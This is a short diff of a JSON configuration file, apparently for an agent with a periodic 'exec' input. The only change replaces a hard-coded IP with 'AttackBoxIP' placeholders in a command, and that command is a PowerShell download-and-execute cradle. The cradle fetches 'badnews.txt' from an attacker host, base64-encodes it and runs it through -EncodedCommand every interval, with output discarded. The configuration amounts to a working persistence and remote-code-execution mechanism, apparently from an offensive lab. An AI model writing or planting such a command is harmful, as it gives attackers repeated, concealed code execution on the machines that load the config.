@@ -9,7 +9,7 @@
   "staleChannelFlushMs": 10000,
   "interval": 10,
   "type": "exec",
-  "command": "powershell -c $naughtywords= (New-Object System.Net.WebClient).DownloadString('http://192.168.245.135:9999/badnews.txt');$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($naughtywords));powershell.exe -EncodedCommand $encodedCommand",
+  "command": "powershell -c $naughtywords= (New-Object System.Net.WebClient).DownloadString('http://AttackBoxIP:AttackBoxHttpServerPort/badnews.txt');$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($naughtywords));powershell.exe -EncodedCommand $encodedCommand",
   "connections": [
     {
       "output": "devnull"
